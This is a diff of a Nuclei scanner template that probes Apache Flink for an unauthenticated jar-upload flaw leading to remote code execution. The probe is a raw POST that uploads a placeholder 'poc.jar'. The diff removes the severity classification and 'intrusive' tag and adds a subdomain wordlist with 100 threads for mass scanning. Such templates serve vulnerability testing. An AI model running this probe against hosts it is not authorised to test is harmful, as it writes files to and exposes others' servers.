@@ -1,36 +1,35 @@
 id: apache-flink-unauth-rce
 
 info:
-  name: Apache Flink - Remote Code Execution
+  name: Apache Flink Unauth RCE
   author: pikpikcu
   severity: critical
-  description: Apache Flink contains an unauthenticated remote code execution vulnerability.
-  reference:
-    - https://www.exploit-db.com/exploits/48978
-    - https://adamc95.medium.com/apache-flink-1-9-x-part-1-set-up-5d85fd2770f3
-    - https://github.com/LandGrey/flink-unauth-rce
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10
-    cwe-id: CWE-77
-  metadata:
-    max-request: 1
-  tags: apache,flink,rce,intrusive,unauth
+  tags: apache,flink,rce
+  reference: |
+      - https://www.exploit-db.com/exploits/48978
+      - https://adamc95.medium.com/apache-flink-1-9-x-part-1-set-up-5d85fd2770f3
+      - https://github.com/LandGrey/flink-unauth-rce
 
-http:
-  - raw:
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
       - |
         POST /jars/upload HTTP/1.1
-        Host: {{Hostname}}
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Content-Length: 187
         Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
 
         --8ce4b16b22b58894aa86c421e8759df3
         Content-Disposition: form-data; name="jarfile";filename="poc.jar"
         Content-Type:application/octet-stream
 
-          {{randstr}}
+          nuclei
         --8ce4b16b22b58894aa86c421e8759df3--
-
     matchers-condition: and
     matchers:
       - type: word
@@ -38,15 +37,12 @@ http:
           - "application/json"
         part: header
         condition: and
-
       - type: word
         words:
           - "success"
           - "_poc.jar"
         part: body
         condition: and
-
       - type: status
         status:
           - 200
-# digest: 490a0046304402204be87008dbdeab7d31922fca3a932dec5fccf32a898c543afb3c66cd6cc3de0702207d221b76fac1b85ac785fecbaa134877dc47bd6ebc279aa2db7aa567b75e4300:922c64590222798bb761d5b6d8e72950
